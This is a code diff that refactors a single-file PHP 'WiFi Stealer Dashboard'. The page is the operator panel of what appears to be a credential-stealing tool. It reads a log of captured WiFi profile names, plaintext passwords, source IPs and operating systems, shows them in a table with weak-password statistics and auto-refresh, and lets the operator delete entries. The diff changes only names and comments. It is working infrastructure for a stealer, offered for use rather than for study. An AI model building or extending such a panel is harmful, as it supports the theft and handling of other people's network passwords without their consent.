@@ -1,152 +1,148 @@
 <?php
-// Wifi Stealer Dashboard - single file
+// WiFi credential logger dashboard
+// Single-file implementation
 
 date_default_timezone_set('Asia/Kolkata');
 
 $logFile = __DIR__ . '/wifi_creds.log';
 
-// Handle "clear all history"
+// Clear all entries if requested
 if (isset($_POST['action']) && $_POST['action'] === 'clear_all') {
     if (file_exists($logFile)) {
-        $fh = fopen($logFile, 'w');
-        if ($fh) {
-            fclose($fh);
+        $handle = fopen($logFile, 'w');
+        if ($handle) {
+            fclose($handle);
         }
     }
     header('Location: ' . $_SERVER['PHP_SELF']);
     exit;
 }
 
-// Handle "delete one entry"
+// Delete single entry
 if (isset($_POST['action']) && $_POST['action'] === 'delete_one') {
-    $idx = isset($_POST['idx']) ? intval($_POST['idx']) : -1;
+    $index = isset($_POST['idx']) ? intval($_POST['idx']) : -1;
 
-    if (file_exists($logFile) && $idx >= 0) {
-        $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        if (isset($lines[$idx])) {
-            unset($lines[$idx]);
-            file_put_contents($logFile, implode(PHP_EOL, $lines) . PHP_EOL);
+    if (file_exists($logFile) && $index >= 0) {
+        $fileLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        if (isset($fileLines[$index])) {
+            unset($fileLines[$index]);
+            file_put_contents($logFile, implode(PHP_EOL, $fileLines) . PHP_EOL);
         }
     }
     header('Location: ' . $_SERVER['PHP_SELF']);
     exit;
 }
 
-// Viewer meta (person looking at dashboard)
-function detect_os_from_ua(string $ua): string {
-    $uaLower = strtolower($ua);
-    if (strpos($uaLower, 'windows') !== false) {
-        return 'Windows';
-    }
-    if (strpos($uaLower, 'android') !== false) {
-        return 'Android';
-    }
-    if (strpos($uaLower, 'iphone') !== false || strpos($uaLower, 'ipad') !== false || strpos($uaLower, 'ios') !== false) {
+// Simple OS detection from user agent string
+function detectOS($userAgent) {
+    $ua = strtolower($userAgent);
+    
+    if (strpos($ua, 'windows') !== false) return 'Windows';
+    if (strpos($ua, 'android') !== false) return 'Android';
+    if (strpos($ua, 'iphone') !== false || strpos($ua, 'ipad') !== false || strpos($ua, 'ios') !== false) {
         return 'iOS';
     }
-    if (strpos($uaLower, 'mac os') !== false || strpos($uaLower, 'macintosh') !== false) {
-        return 'macOS';
-    }
-    if (strpos($uaLower, 'linux') !== false) {
-        return 'Linux';
-    }
+    if (strpos($ua, 'mac os') !== false || strpos($ua, 'macintosh') !== false) return 'macOS';
+    if (strpos($ua, 'linux') !== false) return 'Linux';
+    
     return 'Unknown';
 }
 
-$viewerIp = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
-$viewerUa = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$viewerOs = detect_os_from_ua($viewerUa);
+$viewerIP = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+$viewerUA = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$viewerOS = detectOS($viewerUA);
 
-// Load log lines
+// Read the log file
 $lines = [];
 if (file_exists($logFile)) {
     $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
 }
 
-// Stats + parsed entries
+// Initialize counters and arrays
 $totalCaptures = 0;
-$ssidCounts = [];
-$ipCounts = [];
-$totalPwLength = 0;
-$weakCount = 0;
-$entries = [];
+$ssidCount = [];
+$ipCount = [];
+$totalPasswordLength = 0;
+$weakPasswords = 0;
+$captureEntries = [];
 
-// Parse CSV log: "profile_name","password","ip","os"
-foreach ($lines as $i => $entry) {
-    $entry = trim($entry);
-    if ($entry === '') {
+// Parse each line from the CSV log
+// Format: "profile_name","password","ip","os"
+foreach ($lines as $lineNum => $line) {
+    $line = trim($line);
+    if (empty($line)) continue;
+
+    // Skip header row if present
+    if (stripos($line, 'profile_name') !== false &&
+        stripos($line, 'password') !== false &&
+        stripos($line, 'ip') !== false &&
+        stripos($line, 'os') !== false) {
         continue;
     }
 
-    // Skip header line
-    if (stripos($entry, 'profile_name') !== false &&
-        stripos($entry, 'password') !== false &&
-        stripos($entry, 'ip') !== false &&
-        stripos($entry, 'os') !== false) {
-        continue;
-    }
+    $fields = str_getcsv($line);
+    if (count($fields) < 4) continue;
 
-    $parts = str_getcsv($entry);
-    if (count($parts) < 4) {
-        continue;
-    }
+    $ssid = trim($fields[0]);
+    $pass = trim($fields[1]);
+    $sourceIP = trim($fields[2]);
+    $sourceOS = trim($fields[3]);
 
-    $ssid     = trim($parts[0]);
-    $password = trim($parts[1]);
-    $ip       = trim($parts[2]);
-    $os       = trim($parts[3]);
-
-    // Use "now" as capture display time
-    $tsRaw = date('Y-m-d H:i:s');
-    $ts = strtotime($tsRaw);
-    $displayTime = $ts ? date('d M Y, h:i:s a', $ts) : htmlspecialchars($tsRaw);
+    // Get current timestamp for display
+    $timestamp = date('Y-m-d H:i:s');
+    $timestampUnix = strtotime($timestamp);
+    $displayTime = $timestampUnix ? date('d M Y, h:i:s a', $timestampUnix) : htmlspecialchars($timestamp);
 
     $totalCaptures++;
 
-    if ($ssid !== '') {
-        $ssidCounts[$ssid] = ($ssidCounts[$ssid] ?? 0) + 1;
+    // Track unique SSIDs
+    if (!empty($ssid)) {
+        $ssidCount[$ssid] = isset($ssidCount[$ssid]) ? $ssidCount[$ssid] + 1 : 1;
     }
-    if ($ip !== '') {
-        $ipCounts[$ip] = ($ipCounts[$ip] ?? 0) + 1;
-    }
-
-    $len = strlen($password);
-    $totalPwLength += $len;
-
-    $onlyLetters = ($password !== '' && ctype_alpha($password));
-    $onlyDigits  = ($password !== '' && ctype_digit($password));
-    $isWeak = ($len < 8 || $onlyLetters || $onlyDigits);
-
-    if ($isWeak) {
-        $weakCount++;
+    
+    // Track source IPs
+    if (!empty($sourceIP)) {
+        $ipCount[$sourceIP] = isset($ipCount[$sourceIP]) ? $ipCount[$sourceIP] + 1 : 1;
     }
 
-    $entries[] = [
-        'idx'      => $i,
-        'time'     => $displayTime,
-        'ip'       => $ip,
-        'os'       => $os,
-        'ssid'     => $ssid,
-        'password' => $password,
-        'len'      => $len,
-        'weak'     => $isWeak,
+    $passLength = strlen($pass);
+    $totalPasswordLength += $passLength;
+
+    // Check password strength (basic)
+    $allLetters = (!empty($pass) && ctype_alpha($pass));
+    $allNumbers = (!empty($pass) && ctype_digit($pass));
+    $weakPassword = ($passLength < 8 || $allLetters || $allNumbers);
+
+    if ($weakPassword) {
+        $weakPasswords++;
+    }
+
+    $captureEntries[] = [
+        'idx' => $lineNum,
+        'time' => $displayTime,
+        'ip' => $sourceIP,
+        'os' => $sourceOS,
+        'ssid' => $ssid,
+        'password' => $pass,
+        'len' => $passLength,
+        'weak' => $weakPassword,
     ];
 }
 
-$uniqueSsids = count($ssidCounts);
-$uniqueIps   = count($ipCounts);
-$avgPwLength = $totalCaptures > 0 ? round($totalPwLength / $totalCaptures, 1) : 0;
-$weakPercent = $totalCaptures > 0 ? round(($weakCount / $totalCaptures) * 100, 1) : 0.0;
+$uniqueSSIDs = count($ssidCount);
+$uniqueIPs = count($ipCount);
+$avgPasswordLen = $totalCaptures > 0 ? round($totalPasswordLength / $totalCaptures, 1) : 0;
+$weakPercentage = $totalCaptures > 0 ? round(($weakPasswords / $totalCaptures) * 100, 1) : 0.0;
 
-// View mode: full or compact
-$view = $_GET['view'] ?? 'full';
-$view = $view === 'compact' ? 'compact' : 'full';
+// View mode selection
+$viewMode = isset($_GET['view']) ? $_GET['view'] : 'full';
+$viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Wifi Stealer Dashboard</title>
+    <title>WiFi Stealer Dashboard</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
     <style>
@@ -156,6 +152,7 @@ $view = $view === 'compact' ? 'compact' : 'full';
             background: radial-gradient(circle at top left, #0f172a 0, #020617 40%, #000 100%);
             color: #e5e7eb;
         }
+        
         .page {
             max-width: 1100px;
             margin: 0 auto;
@@ -165,6 +162,7 @@ $view = $view === 'compact' ? 'compact' : 'full';
             flex-direction: column;
             gap: 16px;
         }
+        
         .page-header {
             display: flex;
             flex-wrap: wrap;
@@ -172,28 +170,34 @@ $view = $view === 'compact' ? 'compact' : 'full';
             justify-content: space-between;
             gap: 12px;
         }
+        
         .title-group {
             display: flex;
             flex-direction: column;
             gap: 4px;
         }
+        
         .title {
             font-size: 22px;
             font-weight: 600;
         }
+        
         .subtitle {
             font-size: 12px;
             color: #9ca3af;
         }
+        
         .viewer-meta {
             font-size: 11px;
             color: #9ca3af;
         }
+        
         .actions {
             display: flex;
             flex-wrap: wrap;
             gap: 8px;
         }
+        
         .btn {
             font-size: 12px;
             border-radius: 999px;
@@ -203,18 +207,22 @@ $view = $view === 'compact' ? 'compact' : 'full';
             color: #e5e7eb;
             cursor: pointer;
         }
+        
         .btn:hover {
             border-color: #4f46e5;
             box-shadow: 0 0 0 1px rgba(79,70,229,0.5);
         }
+        
         .btn-danger {
             border-color: rgba(248,113,113,0.7);
             color: #fecaca;
             background: linear-gradient(135deg, rgba(127,29,29,0.9), rgba(127,29,29,0.6));
         }
+        
         .btn-danger:hover {
             box-shadow: 0 0 0 1px rgba(248,113,113,0.7);
         }
+        
         .btn-sm {
             padding: 4px 8px;
             font-size: 11px;
@@ -225,18 +233,21 @@ $view = $view === 'compact' ? 'compact' : 'full';
             grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
             gap: 12px;
         }
+        
         .stat-card {
             background: #0f172a;
             border-radius: 10px;
             padding: 10px 12px;
             border: 1px solid rgba(148,163,184,0.25);
         }
+        
         .stat-label {
             font-size: 11px;
             text-transform: uppercase;
             letter-spacing: 0.08em;
             color: #9ca3af;
         }
+        
         .stat-value {
             margin-top: 4px;
             font-size: 18px;
@@ -251,16 +262,19 @@ $view = $view === 'compact' ? 'compact' : 'full';
             box-shadow: 0 22px 45px rgba(15,23,42,0.7);
             padding: 12px 14px;
         }
+        
         table {
             width: 100%;
             border-collapse: collapse;
             font-size: 12px;
         }
+        
         th, td {
             padding: 6px 8px;
             border-bottom: 1px solid rgba(55,65,81,0.8);
             text-align: left;
         }
+        
         th {
             font-size: 11px;
             text-transform: uppercase;
@@ -268,26 +282,32 @@ $view = $view === 'compact' ? 'compact' : 'full';
             color: #9ca3af;
             background: radial-gradient(circle at top left, rgba(79,70,229,0.25), transparent 60%);
         }
+        
         tr:hover {
             background: rgba(31,41,55,0.7);
         }
+        
         .badge {
             display: inline-block;
             border-radius: 999px;
             padding: 2px 6px;
             font-size: 10px;
         }
+        
         .badge-weak {
             background: rgba(248,113,113,0.18);
             color: #fecaca;
         }
+        
         .badge-ok {
             background: rgba(74,222,128,0.18);
             color: #bbf7d0;
         }
+        
         .password {
             font-family: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
         }
+        
         .footer {
             margin-top: auto;
             font-size: 11px;
@@ -299,49 +319,56 @@ $view = $view === 'compact' ? 'compact' : 'full';
     </style>
 
     <script>
-        let autoRefreshEnabled = false;
-        let autoRefreshInterval = null;
-        const AUTO_REFRESH_MS = 10000; // 10 seconds
+        var autoRefresh = false;
+        var refreshTimer = null;
+        var REFRESH_INTERVAL = 10000; // refresh every 10 seconds
 
-        function setAutoRefresh(on) {
-            autoRefreshEnabled = on;
-            if (autoRefreshInterval) {
-                clearInterval(autoRefreshInterval);
-                autoRefreshInterval = null;
+        function toggleAutoRefresh(enabled) {
+            autoRefresh = enabled;
+            
+            if (refreshTimer) {
+                clearInterval(refreshTimer);
+                refreshTimer = null;
             }
-            const btn = document.getElementById('auto-refresh-toggle');
-            if (autoRefreshEnabled) {
-                autoRefreshInterval = setInterval(function () {
+            
+            var toggleBtn = document.getElementById('auto-refresh-toggle');
+            
+            if (autoRefresh) {
+                refreshTimer = setInterval(function() {
                     window.location.reload();
-                }, AUTO_REFRESH_MS);
-                if (btn) {
-                    btn.innerText = 'Auto-refresh: ON';
+                }, REFRESH_INTERVAL);
+                
+                if (toggleBtn) {
+                    toggleBtn.innerText = 'Auto-refresh: ON';
                 }
+                
+                // Save preference
                 if (window.localStorage) {
                     localStorage.setItem('wifi_dashboard_auto_refresh', 'on');
                 }
             } else {
-                if (btn) {
-                    btn.innerText = 'Auto-refresh: OFF';
+                if (toggleBtn) {
+                    toggleBtn.innerText = 'Auto-refresh: OFF';
                 }
+                
                 if (window.localStorage) {
                     localStorage.setItem('wifi_dashboard_auto_refresh', 'off');
                 }
             }
         }
 
-        document.addEventListener('DOMContentLoaded', function () {
-            let defaultOn = true;
-            let stored = null;
+        document.addEventListener('DOMContentLoaded', function() {
+            var enableByDefault = true;
+            var savedPreference = null;
 
             if (window.localStorage) {
-                stored = localStorage.getItem('wifi_dashboard_auto_refresh');
+                savedPreference = localStorage.getItem('wifi_dashboard_auto_refresh');
             }
 
-            if (stored === 'on' || (stored === null && defaultOn)) {
-                setAutoRefresh(true);
+            if (savedPreference === 'on' || (savedPreference === null && enableByDefault)) {
+                toggleAutoRefresh(true);
             } else {
-                setAutoRefresh(false);
+                toggleAutoRefresh(false);
             }
         });
     </script>
@@ -350,35 +377,35 @@ $view = $view === 'compact' ? 'compact' : 'full';
 <div class="page">
     <div class="page-header">
         <div class="title-group">
-            <div class="title">Wifi Stealer Dashboard</div>
+            <div class="title">WiFi Stealer Dashboard</div>
             <div class="subtitle">
                 Captures: <?php echo htmlspecialchars($totalCaptures); ?> •
                 Timezone: IST (12-hour)
             </div>
             <div class="viewer-meta">
-                You are viewing from IP <?php echo htmlspecialchars($viewerIp); ?> on <?php echo htmlspecialchars($viewerOs); ?>
+                You are viewing from IP <?php echo htmlspecialchars($viewerIP); ?> on <?php echo htmlspecialchars($viewerOS); ?>
             </div>
         </div>
         <div class="actions">
-            <!-- View mode buttons -->
+            <!-- View mode switcher -->
             <a href="?view=full" class="btn btn-sm"
-               style="text-decoration:none; <?php echo $view === 'full' ? 'border-color:#4f46e5;' : ''; ?>">
+               style="text-decoration:none; <?php echo $viewMode === 'full' ? 'border-color:#4f46e5;' : ''; ?>">
                 Full view
             </a>
             <a href="?view=compact" class="btn btn-sm"
-               style="text-decoration:none; <?php echo $view === 'compact' ? 'border-color:#4f46e5;' : ''; ?>">
+               style="text-decoration:none; <?php echo $viewMode === 'compact' ? 'border-color:#4f46e5;' : ''; ?>">
                 Compact view
             </a>
 
-            <!-- Auto-refresh toggle -->
+            <!-- Auto-refresh button -->
             <button type="button"
                     class="btn"
                     id="auto-refresh-toggle"
-                    onclick="setAutoRefresh(!autoRefreshEnabled);">
+                    onclick="toggleAutoRefresh(!autoRefresh);">
                 Auto-refresh: OFF
             </button>
 
-            <!-- Clear all history -->
+            <!-- Clear history button -->
             <form method="post"
                   onsubmit="return confirm('Delete ALL history? This cannot be undone.');"
                   style="display:inline;">
@@ -390,7 +417,7 @@ $view = $view === 'compact' ? 'compact' : 'full';
         </div>
     </div>
 
-    <!-- Defensive stats -->
+    <!-- Statistics cards -->
     <div class="stats-grid">
         <div class="stat-card">
             <div class="stat-label">Total captures</div>
@@ -398,19 +425,19 @@ $view = $view === 'compact' ? 'compact' : 'full';
         </div>
         <div class="stat-card">
             <div class="stat-label">Unique SSIDs</div>
-            <div class="stat-value"><?php echo htmlspecialchars($uniqueSsids); ?></div>
+            <div class="stat-value"><?php echo htmlspecialchars($uniqueSSIDs); ?></div>
         </div>
         <div class="stat-card">
             <div class="stat-label">Source IPs</div>
-            <div class="stat-value"><?php echo htmlspecialchars($uniqueIps); ?></div>
+            <div class="stat-value"><?php echo htmlspecialchars($uniqueIPs); ?></div>
         </div>
         <div class="stat-card">
             <div class="stat-label">Avg password length</div>
-            <div class="stat-value"><?php echo htmlspecialchars($avgPwLength); ?></div>
+            <div class="stat-value"><?php echo htmlspecialchars($avgPasswordLen); ?></div>
         </div>
         <div class="stat-card">
             <div class="stat-label">Weak passwords</div>
-            <div class="stat-value"><?php echo htmlspecialchars($weakPercent); ?>%</div>
+            <div class="stat-value"><?php echo htmlspecialchars($weakPercentage); ?>%</div>
         </div>
     </div>
 
@@ -420,12 +447,12 @@ $view = $view === 'compact' ? 'compact' : 'full';
             <tr>
                 <th>#</th>
                 <th>Time (IST)</th>
-                <?php if ($view === 'full'): ?>
+                <?php if ($viewMode === 'full'): ?>
                     <th>Source IP</th>
                     <th>OS</th>
                 <?php endif; ?>
                 <th>SSID</th>
-                <?php if ($view === 'full'): ?>
+                <?php if ($viewMode === 'full'): ?>
                     <th>Password</th>
                     <th>Length</th>
                     <th>Strength</th>
@@ -436,32 +463,32 @@ $view = $view === 'compact' ? 'compact' : 'full';
             </tr>
             </thead>
             <tbody>
-            <?php if (empty($entries)): ?>
+            <?php if (empty($captureEntries)): ?>
                 <tr>
                     <td colspan="9" style="text-align:center; padding:12px; color:#9ca3af;">
                         No captures yet.
                     </td>
                 </tr>
             <?php else: ?>
-                <?php foreach ($entries as $row): ?>
+                <?php foreach ($captureEntries as $entry): ?>
                     <tr>
-                        <td><?php echo htmlspecialchars($row['idx']); ?></td>
-                        <td><?php echo htmlspecialchars($row['time']); ?></td>
+                        <td><?php echo htmlspecialchars($entry['idx']); ?></td>
+                        <td><?php echo htmlspecialchars($entry['time']); ?></td>
 
-                        <?php if ($view === 'full'): ?>
-                            <td><?php echo htmlspecialchars($row['ip']); ?></td>
-                            <td><?php echo htmlspecialchars($row['os']); ?></td>
+                        <?php if ($viewMode === 'full'): ?>
+                            <td><?php echo htmlspecialchars($entry['ip']); ?></td>
+                            <td><?php echo htmlspecialchars($entry['os']); ?></td>
                         <?php endif; ?>
 
-                        <td><?php echo htmlspecialchars($row['ssid']); ?></td>
+                        <td><?php echo htmlspecialchars($entry['ssid']); ?></td>
 
-                        <?php if ($view === 'full'): ?>
+                        <?php if ($viewMode === 'full'): ?>
                             <td class="password">
-                                <?php echo htmlspecialchars($row['password']); ?>
+                                <?php echo htmlspecialchars($entry['password']); ?>
                             </td>
-                            <td><?php echo htmlspecialchars($row['len']); ?></td>
+                            <td><?php echo htmlspecialchars($entry['len']); ?></td>
                             <td>
-                                <?php if ($row['weak']): ?>
+                                <?php if ($entry['weak']): ?>
                                     <span class="badge badge-weak">weak</span>
                                 <?php else: ?>
                                     <span class="badge badge-ok">ok</span>
@@ -470,10 +497,10 @@ $view = $view === 'compact' ? 'compact' : 'full';
                         <?php else: ?>
                             <td>
                                 <span class="password">
-                                    <?php echo htmlspecialchars($row['password']); ?>
+                                    <?php echo htmlspecialchars($entry['password']); ?>
                                 </span>
                                 <br>
-                                <?php if ($row['weak']): ?>
+                                <?php if ($entry['weak']): ?>
                                     <span class="badge badge-weak">weak</span>
                                 <?php else: ?>
                                     <span class="badge badge-ok">ok</span>
@@ -486,7 +513,7 @@ $view = $view === 'compact' ? 'compact' : 'full';
                                   style="display:inline;"
                                   onsubmit="return confirm('Delete this entry?');">
                                 <input type="hidden" name="action" value="delete_one">
-                                <input type="hidden" name="idx" value="<?php echo htmlspecialchars($row['idx']); ?>">
+                                <input type="hidden" name="idx" value="<?php echo htmlspecialchars($entry['idx']); ?>">
                                 <button type="submit" class="btn btn-sm btn-danger">
                                     Delete
                                 </button>
@@ -500,7 +527,7 @@ $view = $view === 'compact' ? 'compact' : 'full';
     </div>
 
     <div class="footer">
-        © 2026 Wifi Stealer Dashboard – made by narain
+        © 2026 WiFi Stealer Dashboard – made by narain
     </div>
 </div>
 </body>
